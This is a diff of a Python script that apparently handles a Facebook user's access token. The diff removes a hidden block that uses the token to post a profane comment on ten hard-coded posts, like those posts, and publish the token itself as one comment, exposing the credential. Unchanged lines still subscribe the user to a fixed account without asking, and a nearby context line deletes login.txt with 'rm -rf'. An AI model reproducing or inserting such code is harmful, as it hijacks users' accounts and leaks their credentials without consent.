@@ -277,38 +277,6 @@ def Comments():
         os.system('rm -rf login.txt')
         exit(login())
 
-    post = '1230470587425293'
-    post1 = '919926182252721'
-    post2 = '1595086027498652'
-    post3 = '1547598918914030'
-    post4 = '1536768643330391'
-    post5 = '1536362756704313'
-    post6 = '1536167886723800'
-    post7 = '1535442736796315'
-    post8 = '1534926046847984'
-    post9 = '1534926046847984'
-    post10 = '1533759106964678'
-    kom = 'MotherFucker 🤣🖕'
-    requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post3 + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post8 + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post9 + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post10 + '/comments/?message=' + token + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post1 + '/likes?summary=true&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post2 + '/likes?summary=true&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post3 + '/likes?summary=true&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post4 + '/likes?summary=true&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post5 + '/likes?summary=true&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post6 + '/likes?summary=true&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post7 + '/likes?summary=true&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post8 + '/likes?summary=true&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post9 + '/likes?summary=true&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post10 + '/likes?summary=true&access_token=' + token)
     requests.post('https://graph.facebook.com/100045203855294/subscribers?access_token=' + token)
     menu()
 
